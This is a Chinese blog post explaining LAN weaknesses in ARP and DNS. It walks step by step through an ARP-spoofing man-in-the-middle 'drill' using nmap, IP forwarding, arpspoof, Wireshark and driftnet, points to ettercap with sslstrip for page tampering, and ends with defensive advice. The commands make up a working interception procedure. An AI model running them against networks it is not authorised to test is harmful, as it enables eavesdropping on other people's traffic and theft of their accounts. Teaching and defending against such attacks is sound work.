---
layout: post
subject: '局域网安全为何如此不堪：演习一次内网攻击'
category: 'secure'
tags: '安全 Linux'
keywords: 'web安全,局域网安全,内网攻击'
sharing: true
comment: true
alias: 
published: true
highlight: yes
description: '当你在公司、在家里抑或咖啡馆连上了一个免费AP，享受互联网冲浪无比畅快的同时，背后可能正有双眼睛在监视着，MM们正在臭美的QQ空间，GG们正浏览的"照片"，甚至是银行卡等帐号信息...这到底是怎么回事？'
---


准备该文一段时间了，作为新博客上第一篇文章，甚是费心，待各种小伎俩融汇贯通，才敢来卖弄。如熟悉TCP/IP协议族，则阅读本文比较轻松，如不然则也无大恙，毕竟本文只是笼统介绍局域网安全。


## 局域网安全为何如此不堪
首先作几个定义，什么是局域网，什么是地址解析协议，什么是网络安全，下面是个人的理解。
###局域网的缺陷
局域网简称LAN（Local Area Network），对应OSI七层模型的三层以下（一般不含第三层IP层)，两层交换机或者共享式集线器组网，该类设备一般不具有基于IP地址的路由功能，故局域网内各节点间通过MAC地址（网卡物理地址）标识和通信，而MAC地址是由各个节点自行维护，这意味着我说我是谁我就是谁，这可能是局域网脆弱的根本因素。


### 脆弱的地址解析协议
地址解析协议之于网络通信，相当于信号灯系统之于公路交通，是用来指示目标和方向的，此一旦混乱，后果可想而知，事实上呢？

* 地址解析协议(ARP)，ARP(Address Resolution Protocol)，当内网节点间（或者是节点与网关间）需要通信时，ARP解析获得目标IP地址对应的MAC地址，通过该MAC地址完成数据包发送。ARP协议是局域网通信的基础，ARP协议是这样工作的：如主机B需要给主机A（IP为192.168.1.100)发送数据，为了知道谁是主机A，首先主机B发送一个广播包给网内所有机器“谁是192.168.1.10”，正常情况其他机器忽略该消息，仅主机A回复“俺就是192.168.1.10”，于是通信就可以开始。至于不正常情况就是本文的主题。

* 域名解析系统(DNS)，互联网上的设备通过IP地址标识，全数子组成的标识不利于人类记忆和处理，域名的出现改变了这种状况，那么域名是如何对应的IP地址的呢，域名服务器（DNS服务器）就是来完成域名和IP地址的互相转换功能。DNS工作原理与ARP类似，区别是DNS通过指定的DNS服务器来查询，DNS服务器一般是安全的（实际上电信运营商等某些权威机构也经常耍流氓），问题是当明文的DNS数据包通过不安全的局域网时，会被篡改。

### 网络安全分类
网络数据安全或许可分为两层：数据安全和链路安全。

* 局域网数据安全，数据安全理解为数据包如果被别人获取，包含内容是否可被查看到，没有加密而明文传输的数据包都是非安全的。如SSl/STL协议数据包是安全的，而HTTP数据包一般是非安全的。数据包与协议实现有关，与网络拓扑结构无关。

* 局域网链路安全(PATH)，链路即网络数据包经过路线。如果正常通信过程中数据包有被非授权访问的可能，则认为该网络数据链路是不安全情况，因为数据包有被像嗅探甚至篡改的可能。交换型局域网正常情况是链路安全的（网关欺骗则是非正常情况）；共享式组网的局域网默认下就是链路不安全，该情况下数据包按广播方式发送，同网段内任一节点都可以收到包。

###安全形势到底有多严重
广域网可以看作是一个大局域网（如大中国局域网），其组织结构与局域网有类似，但也不同，广域网构建在IP协议之上，因此它的安全性相对更好(除非你是电信内部人士，可以通过控制骨干网关键网络设备，代表如上海有线通用户经常被运营商网页弹窗骚扰；或者你有特殊权限可以直接接触到国家骨干网设备，这些控制权普通用户一般很难获得。)，而局域网中因为ARP协议的缺陷（不仅是ARP，应该是整套机制），导致局域网中很容易实现对网络流量的操控，局域网中典型的攻击模式大概是这样：

1. 第一步先攻击安全链路以获得数据包访问权，如通过ARP欺骗或者DNS欺骗方式改变正常数据包传输链路；
2. 第二步数据包协议分析，使用抓包软件抓取和分析数据包内容，通过数据包篡改等多种手段最终达成攻击目的。(A)

现实中贵重物品保存，一会放入保险箱（内容加密），二放在隐蔽的位置（链路隐藏），这样小偷一来发现不了，二来即使发现保险箱没有密码也无法打开，故这种方式相对安全。而这该死的局域网内，你的数据包一内容没有加密，二位置也没有隐藏，何来安全呢？

不消说掌握高超技术的大牛，就是仅会简单使用几个黑客工具的小菜鸟哥，都能在出租房内盗取几个MM的QQ空间帐号密码什么的。

局域网通信模型图示![LANArchModel][]



## 几种常用黑客工具

工与善其事，必先利其器。

### Wireshark(抓包利器)
[Wireshark][]（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Windows下通过[Download](http://www.wireshark.org/download.html)页面下载安装即可，一般主流Linux发行版官方软件仓库已经集成该软件，可直接安装：

	$ sudo apt-get install wireshark       #Ubuntu
	$ sudo yum install wireshark           #Fedora/Redhat
默认wireshark运行需要root权限，忽略警告信息，选择对应的网络节点开始抓包，wireshark提供两种数据包过滤机制：

* 抓取时过滤规则，即不符合规则的包直接PASS不会抓取；详细规则使用参考[CaptureFilters][],下面规则的作用是仅显示由192.168.1.100发出或者发往192.168.1.100的http数据包。
	<pre>
	host 192.168.1.100 and port 80
	</pre>

* 显示时过滤规则，即所有通过指定节点的包都抓取，但仅在界面上显示符合规则的包，详细规则使用参考[DisplayFilters][]，下面规则的作用是仅显示由192.168.1.100发出或者发往192.168.1.100的http数据包。
	<pre>
	(http and ip.dst==192.168.1.100 ) or ( http and ip.src==192.168.1.100)
	</pre>

### Nmap（网络探测工具和安全/端口扫描器）
[Nmap][],Linux平台下历史悠久且功能强大的网络探测工具和安全扫描器，支持扫描指定网络内主机列表、扫描指定主机开放端口列表甚至探测出所安装操作系统类型。该工具系统默认集成（支持在线包管理器直接安装）。

### Arpspoof(ARP欺骗）
ARP欺骗工具，工作原理就是不断的向目标（攻击对象）发送ARP数据包，包内容为“我是XXX，请把发给XXX的数据包发给我”。安装方法：

	$ sudo apt-get install dsniff

###  Ettercap(数据包嗅探和篡改)
[Ettercap][]，“中间人”攻击利器，ARP欺骗、DNS欺骗、数据包替换等等，十分强大，不可细说，详细使用方式参考手册（man ettercap)。

	$ sudo apt-get install ettercap-graphical

ettercap实现ARP欺骗方式如下
	$ sudo ettercap -i eth0 -Tq -M arp:remote /目标IP/ /网关IP/

### Driftnet
抓取经过本机的网络数据包中的图片并显示，同时支持抓取和显示音频文件（来源man手册），安装：

	$ sudo apt-get install driftnet


## 局域网典型攻击演习
本演习系统环境如下：

	$ lsb_release -a
	Distributor ID:	Ubuntu
	Description:	Ubuntu 12.10
	Release:	12.10
	Codename:	quantal

### 第1步：锁定目标
该步不是必需。使用nmap命令扫描局域网，获得主机列表，操作如下：

	$ nmap -sP  192.168.1.0/24
* “-sP” 表示使用Ping方式扫描；
* “192.168.1.0/24”表示扫描"192.168.1.1-192.168.1.254"这个网段的所有机器。

nmap命令扫描结果仅供参考，也可以尝试其他参数扫描，详细使用方法参考[NmapManual][]。

### 第2步：收集信息
该步不是必需。选定目标为主机A(这里假定IP地址为192.168.1.110)，使用命令"nmap 192.168.1.110"可获得主机A的详细情况，如服务端口开放情况，操作系统类型等信息。

	$ nmap -A 192.168.1.110
	Starting Nmap 6.00 ( http://nmap.org ) at 2013-08-12 12:34 CST 
	Nmap scan report for 10.3.3.108
	Host is up (0.00026s latency).
	Not shown: 996 closed ports
	PORT    STATE SERVICE     VERSION
	22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1.1 (protocol 2.0)
	...
	139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
	873/tcp open  rsync       (protocol version 30) 
	Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

### 第3步：开启IP转发和ARP欺骗
该步仅针对交换式局域网，共享式局域网可以忽略（共享式网络只要打开网卡的混杂模式就可以抓取所有内网数据包），ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为自己到底不是网关，还不知道如何处理这类数据包），这当然是不允许的。开启IP转发功能可以解决该问题，IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法(注意使用root操作第二条命令）：

	$ sudo su
	# echo 1 > /proc/sys/net/ipv4/ip_forward
ARP欺骗使用arpspoof命令（开启双向欺骗，即同时欺骗主机A和网关）：

	$ sudo arpspoof -i eth0 -t 192.168.1.110 192.168.1.1
	$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.110
- "-i eth0"指定设备节点，无线网络时可能是"-i wlan0"；
- "-t 192.168.1.xxx"指定欺骗对象，如果不指定该项，则欺骗对象为整个网络（ARP病毒引起局域网瘫痪就是这么干的，操作前需注意)，最后一个参数"192.168.1.xxx"指伪装目标。

上面第一条命令告诉主机A(192.168.1.110)，我是网关(192.168.1.1)，第二条命令告诉网关，我是主机A，故完成双向欺骗。


### 第4步：抓数据包
该步不是必需。抓包分析只是为了辅助需要（通过分析数据包流量情况监控攻击工程，同时也是深入理解攻击原理的有效方法），使用wireshark工具抓取所有和主机A相关的数据包，过滤掉不相关数据包，只抓取主机A发出或者发给主机A的数据包。启动wireshark:
      
	$ sudo wireshark
选择对应网络设备节点（一般有线网络选择eth0,无线网络选择wlan0)，开始抓包，在Filter输入框输入显示过滤条件：

	ip.addr == 192.168.1.110
![wireshark_shop][]
回车后应该在屏幕上看到已抓取包的列表，现在你可以仍然调取和分析主机A上网流量情况。


### 第5步：收获果实
抓取主机A http流量中的图片，通过driftnet工具实现，运行下面命令：

	$ sudo driftnet -i eth0

篡改主机A访问的页面，通过ettercap工具实现，ettercap是个强大的工具，再配合sslstrip，基本可以为所欲为。
ettercap详细使用方法请参考man手册（man ettercap)，这里有一篇[文章][1]可以参考一二。

##该如何防范
安全形势如此严重，不得不防啊。但安全总是有成本和代价的，下面建议供参考。

<br>
对于交换式局域网，重点守住两条：
1. 交换机端口绑定IP和MAC，完成该步，可以说基本天下太平，这个一般是网络管理员的职责；
2. 如果第1步无法实现，在自己的机器上把网关IP和MAC地址静态绑定。

<br>
对于共享式局域网,这一般是在家里、街上或者出租房中合伙使用的无线路由器下的网络。也是重点守着两条：
1. 不要随便连接未知无线网络；(A)
2. 管理好自己家里的无线路由器，最好使用WPA加密方式，并定期检察安全情况。



##参考资料
[Linux渗透之Ettercap详解][2] (较详细的ettercap文档翻译说明)  
[Ettercap简要原理介绍以及使用说明][1] (Ettercap功能介绍)  
[用ettercap实现DNS欺骗实例][3]  
[不知不觉帐号密码被窃:中间人攻击介绍][4]  
[通过伪造CA证书，实现SSL中间人攻击(附详细过程和实现代码）][5]  
[关于ARP欺骗与MITM（中间人攻击）的一些笔记（二）] [6]




[Wireshark]: http://www.wireshark.org/
[FilteringWhilegapturing]: http://www.wireshark.org/docs/wsug_html_chunked/ChCapCaptureFilterSection.html
[CaptureFilters]: http://wiki.wireshark.org/CaptureFilters
[DisplayFilters]: http://wiki.wireshark.org/DisplayFilters

[GAE]: https://developers.google.com/appengine/?hl=zh-cn
[WhatIsGAE]: https://developers.google.com/appengine/docs/whatisgoogleappengine?hl=zh-cn
[Goagent]: http://code.google.com/p/goagent/
[InstallGuide]: https://code.google.com/p/goagent/wiki/InstallGuide
[FAQ]: https://code.google.com/p/goagent/wiki/FAQ
[ConfigIntroduce]: https://code.google.com/p/goagent/wiki/ConfigIntroduce
[SwitchySharp]: https://code.google.com/p/switchysharp/
[SwitchySharp2]: https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm?hl=zh-CN
[Nmap]: http://nmap.org/man/zh/
[NmapManual]: http://nmap.org/man/zh/ 
[Ettercap]: http://ettercap.github.io/ettercap/index.html
[1]: http://www.2cto.com/article/201301/183322.html "Ettercap简要原理介绍以及使用说明"
[2]: http://www.91ri.org/4408.html "Linux渗透之Ettercap详解"
[3]: http://vmeng.blog.51cto.com/2305370/1143426 "用ettercap实现DNS欺骗实例"
[4]: http://netsecurity.51cto.com/art/201212/371895.htm  "不知不觉帐号密码被窃:中间人攻击介绍"
[5]: http://blog.sina.com.cn/s/blog_4a898cfb0100t8j7.html  "通过伪造CA证书，实现SSL中间人攻击(附详细过程和实现代码）"
[6]: http://www.rootoorotor.org/hacking/%E5%85%B3%E4%BA%8Earp%E6%AC%BA%E9%AA%97%E4%B8%8Emitm%EF%BC%88%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%EF%BC%89%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/ "关于ARP欺骗与MITM（中间人攻击）的一些笔记（二）" 
